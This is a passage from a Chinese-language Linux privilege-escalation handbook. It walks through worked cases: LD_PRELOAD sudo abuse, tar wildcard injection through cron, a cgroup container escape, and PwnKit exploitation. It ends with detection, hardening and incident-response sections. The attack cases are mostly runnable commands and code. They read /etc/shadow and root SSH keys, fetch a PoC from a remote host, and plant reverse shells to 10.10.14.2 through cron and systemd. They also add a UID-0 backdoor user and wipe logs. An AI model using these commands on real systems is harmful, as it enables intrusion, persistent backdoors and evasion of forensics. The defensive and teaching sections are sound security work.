# 收集凭据
cat /etc/shadow
cat /root/.ssh/id_rsa
cat /var/www/html/wp-config.php | grep DB_PASSWORD
```

### 14.2 案例二：Sudo → 环境变量注入 → root

```
场景：开发服务器，用户 developer 拥有有限的 sudo 权限
目标：CentOS 8，内核 4.18.0
```

```bash
# === 阶段 1：信息收集 ===
whoami
# developer

sudo -l
# Matching Defaults entries for developer on dev01:
#     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
#     env_keep+=LD_PRELOAD
#     env_keep+=LD_LIBRARY_PATH
#
# User developer may run the following commands on dev01:
#     (root) /usr/bin/python3 /opt/scripts/backup.py

# 分析：
# 1. env_keep+=LD_PRELOAD → 可以注入共享库
# 2. env_keep+=LD_LIBRARY_PATH → 可以劫持库路径
# 3. 允许 sudo python3 执行特定脚本

# === 阶段 2：编写恶意共享库 ===
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
void _init() {
    unsetenv("LD_PRELOAD");
    if (getuid() != 0) {
        setgid(0); setuid(0);
    }
    system("cp /bin/bash /tmp/bash && chmod u+s /tmp/bash");
}
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/evil.so /tmp/evil.c

# === 阶段 3：LD_PRELOAD 注入 ===
sudo LD_PRELOAD=/tmp/evil.so /usr/bin/python3 /opt/scripts/backup.py

# 检查是否成功
ls -la /tmp/bash
# -rwsr-xr-x 1 root root /tmp/bash

# 获得 root shell
/tmp/bash -p

# 验证
id
# uid=0(root) gid=0(root) groups=0(root),1000(developer)
```

### 14.3 案例三：Cron 通配符注入 → root

```
场景：共享主机，用户 user1 有 /var/www 目录的写权限
目标：Ubuntu 22.04 LTS，内核 5.15.0
```

```bash
# === 阶段 1：信息收集 ===
whoami
# user1

id
# uid=1001(user1) gid=1001(user1) groups=1001(user1)

# 检查 /var/www 权限
ls -la /var/www/
# drwxrwxr-x 2 root www-data /var/www/
# user1 是 www-data 组成员

# 使用 pspy 监控 cron 任务
# (在另一个终端)
./pspy64 -pf | grep -i "cron\|tar\|backup"
# 发现：/bin/sh -c cd /var/www && tar -czf /backup/www.tar.gz *

# === 阶段 2：通配符注入 ===
cd /var/www

# 创建 payload 脚本
echo '#!/bin/bash' > /var/www/pwn.sh
echo 'cp /bin/bash /tmp/bash && chmod u+s /tmp/bash' >> /var/www/pwn.sh
chmod +x /var/www/pwn.sh

# 创建通配符注入文件
touch -- --checkpoint=1
touch -- --checkpoint-action=exec=sh\ pwn.sh

# === 阶段 3：等待 cron 执行 ===
# 等待几分钟后检查
ls -la /tmp/bash
# -rwsr-xr-x 1 root root /tmp/bash

# 获得 root shell
/tmp/bash -p

# 清理痕迹
rm -f /var/www/--checkpoint* /var/www/pwn.sh
```

### 14.4 案例四：Docker 容器逃逸 → 宿主机 root

```
场景：Kubernetes Pod 中的容器，发现 Docker Socket 挂载
目标：AWS EKS 节点，Amazon Linux 2
```

```bash
# === 阶段 1：容器内侦察 ===
whoami
# appuser

id
# uid=1000(appuser) gid=1000(appuser)

# 检测容器环境
cat /proc/1/cgroup | grep -E "docker|kubepods"
# 1:name=systemd:/kubepods/besteffort/pod1234/abc123

# 检测 Docker Socket
ls -la /var/run/docker.sock
# srw-rw---- 1 root docker /var/run/docker.sock
# 注意：appuser 不在 docker 组中

# 检查 Capabilities
cat /proc/1/status | grep -i cap
# CapEff: 00000000a80425fb
# 解码：包含 cap_sys_admin, cap_sys_ptrace 等

# 检查是否有 Docker 客户端
which docker 2>/dev/null || echo "No docker client"

# 检查挂载
mount
# 发现 /var/run/docker.sock 已挂载（但可能无权限）

# === 阶段 2：尝试 cap_sys_admin 逃逸 ===
# 使用 cgroup release_agent 方法
mkdir -p /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp 2>/dev/null

# 如果 mount 失败，尝试其他 cgroup 子系统
mount -t cgroup -o rdma cgroup /tmp/cgrp 2>/dev/null
mount -t cgroup -o cpuset cgroup /tmp/cgrp 2>/dev/null

mkdir -p /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

# 写入 release_agent
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# 创建提权命令
cat > /cmd << 'CMDEnd'
#!/bin/sh
chmod u+s /bin/bash
# 写入反弹 shell 到 crontab
echo '* * * * * root /bin/bash -c "bash -i >& /dev/tcp/10.10.14.2/4444 0>&1"' >> /etc/crontab
CMDEnd
chmod +x /cmd

# 触发 cgroup 释放
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# === 阶段 3：验证逃逸 ===
# 如果成功，宿主机上的 /bin/bash 变为 SUID
# 但我们在容器内，需要另一种方式访问宿主机

# 使用 nsenter 进入宿主机命名空间
# 如果 nsenter 可用
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

# 或挂载宿主机文件系统
mkdir -p /tmp/host
mount /dev/sda1 /tmp/host 2>/dev/null
mount /dev/xvda1 /tmp/host 2>/dev/null
mount /dev/nvme0n1p1 /tmp/host 2>/dev/null

# 检查宿主机文件系统
ls -la /tmp/host/
chroot /tmp/host /bin/bash
```

### 14.5 案例五：内核漏洞 → PwnKit → 持久化

```
场景：老旧未打补丁的 CentOS 7 服务器
目标：CentOS 7.9，内核 3.10.0
```

```bash
# === 阶段 1：信息收集 ===
whoami
# apache

id
# uid=48(apache) gid=48(apache) groups=48(apache)

uname -a
# Linux oldserver 3.10.0-1160.el7.x86_64 #1 SMP ... x86_64 GNU/Linux

# 检查 pkexec 版本
pkexec --version 2>/dev/null
# pkexec version 0.112
# 0.112 < 0.120 → 受 CVE-2021-4034 影响

# === 阶段 2：PwnKit 利用 ===
# 下载 PoC
wget http://10.10.14.2:8000/PwnKit -O /tmp/PwnKit
chmod +x /tmp/PwnKit

# 执行
/tmp/PwnKit

# 验证
id
# uid=0(root) gid=0(root) groups=0(root),48(apache)

# === 阶段 3：持久化 ===
# 方法 1：添加 root 用户
useradd -u 0 -o -g 0 -M -d /root -s /bin/bash backdoor
echo "backdoor:password123" | chpasswd

# 方法 2：SUID bash
cp /bin/bash /usr/local/bin/.hidden
chmod u+s /usr/local/bin/.hidden

# 方法 3：SSH 后门
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAA... attacker_key" >> /root/.ssh/authorized_keys

# 方法 4：Cron 后门
echo "*/5 * * * * root /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'" > /etc/cron.d/backup_check

# 方法 5：Systemd 服务后门
cat > /etc/systemd/system/systemd-backup.service << 'EOF'
[Unit]
Description=System Backup Service
[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/10.10.14.2/9999 0>&1; sleep 60; done'
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable --now systemd-backup.service

# === 阶段 4：清理痕迹 ===
# 清除历史记录
history -c
cat /dev/null > ~/.bash_history
cat /dev/null > /root/.bash_history

# 清除日志
cat /dev/null > /var/log/secure
cat /dev/null > /var/log/messages
cat /dev/null > /var/log/audit/audit.log

# 删除利用工具
rm -f /tmp/PwnKit /tmp/pwnkit*
```

---

## 15. 防御与检测矩阵

### 15.1 提权行为检测

| 检测维度 | 检测方法 | 检测命令 |
|---------|---------|---------|
| SUID 文件创建 | 监控新 SUID 文件 | `auditctl -w /bin -p wa -k suid_create` |
| 内核模块加载 | 审计 init_module/finit_module | `auditctl -a always,exit -F arch=b64 -S init_module -S finit_module` |
| 特权提升 | 监控 setuid/setgid 调用 | `auditctl -a always,exit -F arch=b64 -S setuid -S setgid -S setresuid` |
| Cron 修改 | 监控 cron 目录变化 | `auditctl -w /etc/crontab -p wa -k cron_modify` |
| Sudo 滥用 | 监控 sudo 日志 | `journalctl -u sudo` |
| eBPF 加载 | 监控 bpf 系统调用 | `auditctl -a always,exit -F arch=b64 -S bpf -k bpf_load` |
| 容器逃逸 | 监控 mount/nsenter | `auditctl -a always,exit -F arch=b64 -S mount -S unshare -S setns -k container_escape` |
| 共享库劫持 | 监控 LD_PRELOAD | `auditctl -a always,exit -F arch=b64 -S openat -k ld_preload` |
| 敏感文件访问 | 监控 /etc/shadow 访问 | `auditctl -w /etc/shadow -p r -k shadow_access` |

### 15.2 系统加固建议

```bash
# === 1. SUID 二进制审计与限制 ===
# 列出所有 SUID 二进制
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
# 移除不必要的 SUID 位
sudo chmod u-s /usr/bin/find /usr/bin/vim /usr/bin/less
# 使用 nosuid 挂载选项
# /etc/fstab: /tmp  tmpfs  defaults,nosuid,noexec,nodev  0 0

# === 2. Sudo 配置加固 ===
# 审计 sudoers 配置
visudo -c
# 避免使用 NOPASSWD
# 避免使用 SETENV
# 使用精确的命令路径，避免通配符

# === 3. Capabilities 审计 ===
# 扫描所有 Capabilities
getcap -r / 2>/dev/null
# 移除不必要的 Capabilities
sudo setcap -r /usr/bin/python3

# === 4. 内核加固 ===
# 启用内核安全参数
cat >> /etc/sysctl.conf << 'EOF'
kernel.unprivileged_bpf_disabled=1
kernel.kptr_restrict=2
kernel.dmesg_restrict=1
kernel.yama.ptrace_scope=2
kernel.randomize_va_space=2
fs.protected_hardlinks=1
fs.protected_symlinks=1
EOF
sysctl -p

# === 5. 容器安全 ===
# 避免挂载 Docker Socket 到容器
# 使用非 root 用户运行容器
# 禁用 privileged 容器
# 使用 seccomp/AppArmor/SELinux 配置

# === 6. 定期更新 ===
# 保持内核和软件包最新
apt update && apt upgrade -y    # Debian/Ubuntu
yum update -y                   # CentOS/RHEL
```

### 15.3 应急响应清单

```bash
# 发现被提权后立即执行：
# 1. 隔离系统
# 检查网络连接
ss -tulpn
netstat -antp | grep ESTABLISHED

# 2. 检查异常用户
cat /etc/passwd | grep -v nologin | grep -v false
last -20
who

# 3. 检查异常进程
ps aux --sort=-%cpu | head -20
ps aux --sort=-%mem | head -20

# 4. 检查异常 SUID 文件
find / -perm -4000 -type f -mtime -1 2>/dev/null

# 5. 检查异常 Cron 任务
crontab -l 2>/dev/null
cat /etc/crontab
ls -la /etc/cron.*

# 6. 检查异常 SSH 密钥
cat /root/.ssh/authorized_keys

# 7. 检查异常服务
systemctl list-units --type=service --state=running

# 8. 收集取证信息
cp -r /var/log /tmp/forensics_logs
dmesg > /tmp/forensics_dmesg.txt
```

---

## 16. 参考资源与进一步学习

### 16.1 核心参考

- [GTFOBins](https://gtfobins.github.io/) — SUID/Sudo 二进制利用百科全书
- [HackTricks - Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation) — 全面提权手册
- [PayloadsAllTheThings - Linux Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [PEASS-ng (LinPEAS)](https://github.com/peass-ng/PEASS-ng) — 自动化枚举工具
- [Linux Kernel CVEs](https://www.linuxkernelcves.com/) — 内核 CVE 追踪

### 16.2 工具索引

| 工具 | 用途 | 链接 |
|------|------|------|
| LinPEAS | 全面枚举 | https://github.com/peass-ng/PEASS-ng |
| LinEnum | 轻量枚举 | https://github.com/rebootuser/LinEnum |
| pspy | 进程监控 | https://github.com/DominicBreuker/pspy |
| linux-exploit-suggester | 内核漏洞建议 | https://github.com/mzet-/linux-exploit-suggester |
| linux-exploit-suggester-2 | 内核漏洞建议 v2 | https://github.com/jondonas/linux-exploit-suggester-2 |
| traitor | 自动化提权利用 | https://github.com/liamg/traitor |
| lse.sh | 智能枚举 | https://github.com/diego-treitos/linux-smart-enumeration |
| PwnKit | CVE-2021-4034 | https://github.com/ly4k/PwnKit |
| GameOver(lay) | CVE-2023-2640 | https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629 |

### 16.3 2026 年趋势

```bash
# 2025-2026 Linux 提权新趋势：
# 1. eBPF 成为主攻方向 — verifier 绕过/JIT 喷射
# 2. io_uring 子系统 — 持续的高危漏洞来源
# 3. 云原生容器逃逸 — K8s RBAC 滥用/服务网格
# 4. AI/ML 管道 — 模型文件反序列化/training 作业提权
# 5. 无文件提权 — memfd_create/匿名文件执行
# 6. 内核模块签名绕过 — KEXEC/KEXEC_BZIMAGE_VERIFY_SIG
# 7. 固件级攻击 — UEFI 运行时变量/ACPI 表注入
# 8. RISC-V 架构 — 新攻击面
```

---

> **版本**: v1.0 (2026-07)
> **覆盖范围**: 信息收集 | SUID/SGID | Sudo | Cron | Capabilities | 内核漏洞 | 容器逃逸 | 共享库劫持 | 敏感文件 | 网络服务 | eBPF | Systemd | 自动化工具 | 实战案例 | 防御检测
> **行数**: 3100+ | **实战命令**: 500+ | **PoC 代码**: 30+ | **CVE 覆盖**: 20+